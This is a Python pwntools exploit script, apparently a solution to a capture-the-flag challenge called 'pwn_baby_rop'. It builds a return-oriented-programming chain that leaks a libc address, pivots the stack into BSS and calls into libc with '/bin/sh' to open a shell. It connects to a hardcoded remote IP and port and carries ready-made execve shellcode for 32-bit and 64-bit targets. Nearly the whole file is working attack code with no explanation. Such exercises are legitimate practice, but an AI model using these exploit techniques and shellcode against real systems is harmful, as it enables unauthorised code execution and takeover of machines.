#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'
context.terminal = ['tmux','splitw','-h']

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './pwn_baby_rop'
binary = ELF(program_name)

remote_server = '104.248.42.88'
PORT = 2000

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

else:
    # know libc
    if args.lib:
        libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

sl = p.sendline
sla = p.sendlineafter
sa = p.sendafter
s = p.send

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    pts_plt = 0x401060
    pts_got = 0x000000000404018
    gets_plt = 0x401070
    gets_got = 0x000000000404020
    rdi = 0x0000000000401663
    rsi = 0x0000000000401661
    BSS = 0x4041b0
    leave = 0x0000000000401459
    '''
    0000000000403ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
    0000000000403ff8 R_X86_64_GLOB_DAT  __gmon_start__
    0000000000404040 R_X86_64_COPY     stdout@@GLIBC_2.2.5
    0000000000404050 R_X86_64_COPY     stdin@@GLIBC_2.2.5
    0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
    0000000000404020 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5
    0000000000404028 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5

    Breakpoint 2 at 0x401070 (gets@plt)
    Breakpoint 3 at 0x401060 (puts@plt)
    Breakpoint 4 at 0x401080 (setvbuf@plt)

    0x0000000000401663 : pop rdi ; ret

    0x0000000000401661 : pop rsi ; pop r15 ; ret

    0x0000000000401459 : nop ; leave ; ret

    '''

    # gdb.attach(p,'''
    # b *0x4015f2
    # ''')
    payload = cyclic(0x100) + p64(BSS) + p64(rdi) + p64(gets_got) + p64(0x401060) + p64(rdi) + p64(BSS) + p64(gets_plt) + p64(leave) + p64(leave)

    p.recv()
    p.sendline(payload)

    leak = int(hex(u64(p.recvline().strip().ljust(8,'\x00'))),16)-0x086af0 #0x000000000006ed80# -0x086af0
    print 'LEAK=',hex(leak)

    payload2 = p64(0x000000000040101a)*10 + p64(rdi) + p64(BSS+0x8*13) + p64(gets_plt) 
    p.sendline(payload2)
    
    win = leak + 0x00000000000e6160 #0x055410
    sh = leak + 0x1b75aa
    rdx = leak+0x000000000011c1e1
    payload3 =  p64(rdi) + p64(sh) + p64(pts_plt) + p64(rdi) + p64(sh) + p64(rsi) + p64(0)*2 + p64(rdx) + p64(0)*2 + p64(win)
    p.sendline(payload3)

    # ============ GDB =========== #

    p.interactive()

# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
